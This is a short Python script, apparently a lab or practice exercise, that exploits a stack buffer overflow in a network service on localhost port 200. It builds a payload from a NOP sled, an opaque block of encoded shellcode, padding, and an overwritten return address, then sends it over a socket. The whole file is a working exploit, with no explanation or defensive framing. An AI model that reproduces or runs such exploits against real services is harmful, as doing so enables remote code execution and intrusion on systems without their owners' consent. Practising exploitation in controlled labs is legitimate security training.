import socket
import struct

RHOST = "localhost"
RPORT = 200

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

padding_length = 508

eip = struct.pack("I", 0x00411807)
remainder = "\xCC" * 100

nops = "\x90" * 30
shellcode = ("\xdd\xc3\xd9\x74\x24\xf4\xbd\x92\x9f\x0f\x01\x58\x2b\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x68\x13\x03\xfa\x8c\xed\xf4\x06\x5a\x73"
"\xf6\xf6\x9b\x14\x7e\x13\xaa\x14\xe4\x50\x9d\xa4\x6e\x34\x12"
"\x4e\x22\xac\xa1\x22\xeb\xc3\x02\x88\xcd\xea\x93\xa1\x2e\x6d"
"\x10\xb8\x62\x4d\x29\x73\x77\x8c\x6e\x6e\x7a\xdc\x27\xe4\x29"
"\xf0\x4c\xb0\xf1\x7b\x1e\x54\x72\x98\xd7\x57\x53\x0f\x63\x0e"
"\x73\xae\xa0\x3a\x3a\xa8\xa5\x07\xf4\x43\x1d\xf3\x07\x85\x6f"
"\xfc\xa4\xe8\x5f\x0f\xb4\x2d\x67\xf0\xc3\x47\x9b\x8d\xd3\x9c"
"\xe1\x49\x51\x06\x41\x19\xc1\xe2\x73\xce\x94\x61\x7f\xbb\xd3"
"\x2d\x9c\x3a\x37\x46\x98\xb7\xb6\x88\x28\x83\x9c\x0c\x70\x57"
"\xbc\x15\xdc\x36\xc1\x45\xbf\xe7\x67\x0e\x52\xf3\x15\x4d\x3b"
"\x30\x14\x6d\xbb\x5e\x2f\x1e\x89\xc1\x9b\x88\xa1\x8a\x05\x4f"
"\xc5\xa0\xf2\xdf\x38\x4b\x03\xf6\xfe\x1f\x53\x60\xd6\x1f\x38"
"\x70\xd7\xf5\xef\x20\x77\xa6\x4f\x90\x37\x16\x38\xfa\xb7\x49"
"\x58\x05\x12\xe2\xf3\xfc\xf5\xcd\xac\xec\x0b\xa6\xae\x10\x14"
"\xb1\x26\xf6\x7e\xad\x6e\xa1\x16\x54\x2b\x39\x86\x99\xe1\x44"
"\x88\x12\x06\xb9\x47\xd3\x63\xa9\x30\x13\x3e\x93\x97\x2c\x94"
"\xbb\x74\xbe\x73\x3b\xf2\xa3\x2b\x6c\x53\x15\x22\xf8\x49\x0c"
"\x9c\x1e\x90\xc8\xe7\x9a\x4f\x29\xe9\x23\x1d\x15\xcd\x33\xdb"
"\x96\x49\x67\xb3\xc0\x07\xd1\x75\xbb\xe9\x8b\x2f\x10\xa0\x5b"
"\xa9\x5a\x73\x1d\xb6\xb6\x05\xc1\x07\x6f\x50\xfe\xa8\xe7\x54"
"\x87\xd4\x97\x9b\x52\x5d\xb7\x79\x76\xa8\x50\x24\x13\x11\x3d"
"\xd7\xce\x56\x38\x54\xfa\x26\xbf\x44\x8f\x23\xfb\xc2\x7c\x5e"
"\x94\xa6\x82\xcd\x95\xe2")
exploit = nops + shellcode
padding_with_exploit = exploit + (padding_length - len(exploit)) * "\x90"

_buffer = padding_with_exploit + eip + remainder 

s.send(_buffer)
s.close()